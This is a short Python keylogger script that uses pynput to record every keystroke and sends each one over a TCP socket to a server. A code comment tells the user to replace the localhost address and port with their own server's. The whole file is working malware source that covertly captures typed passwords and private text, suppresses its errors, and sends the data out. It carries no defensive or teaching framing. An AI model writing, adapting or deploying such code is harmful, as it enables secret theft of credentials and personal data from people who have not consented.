from pynput import keyboard
import socket

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
         key_data = str(key) 

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 12345)) #change the IP and port to your server
        s.sendall(key_data.encode())
        s.close()
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
